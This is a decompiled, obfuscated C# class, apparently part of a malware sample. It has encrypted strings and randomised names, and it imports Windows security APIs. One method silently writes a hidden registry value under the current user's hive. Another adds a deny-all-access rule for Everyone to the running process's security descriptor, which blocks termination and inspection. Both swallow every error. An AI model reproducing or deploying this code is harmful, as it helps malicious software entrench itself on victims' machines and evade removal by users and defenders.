using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace WEoqBCtavg;

internal sealed class sYYyBFZVfj
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr jXzcWLzMFQM, int cfamyorMwbp, [Out] byte[] FUvXqsUnNxRVEH, uint WMqkkqBIpdHRhRS, out uint WpPyUIMWerxXea);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr QvwnUhZLkhNT, int FVNPWkawXlNeu, [In] byte[] kMKcDhTWvoLz);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void fbPeNLhJwzqmnV(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(TwRTxDxfshC.czGbdVLSgBt(getString_0(107368545)));
			registryKey.SetValue(TwRTxDxfshC.czGbdVLSgBt(getString_0(107368440)), getString_0(107396704));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor cuuLICVxXfZrMI(IntPtr intptr_0)
	{
		byte[] fUvXqsUnNxRVEH = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, fUvXqsUnNxRVEH, 0u, out var WpPyUIMWerxXea);
		if ((long)WpPyUIMWerxXea > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, fUvXqsUnNxRVEH = new byte[WpPyUIMWerxXea], WpPyUIMWerxXea, out WpPyUIMWerxXea))
		{
			return null;
		}
		return new RawSecurityDescriptor(fUvXqsUnNxRVEH, 0);
	}

	private void ZWDBwzlwJVze(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void vNMrJiDnKvA()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = cuuLICVxXfZrMI(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			ZWDBwzlwJVze(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static sYYyBFZVfj()
	{
		Strings.CreateGetStringDelegate(typeof(sYYyBFZVfj));
	}
}
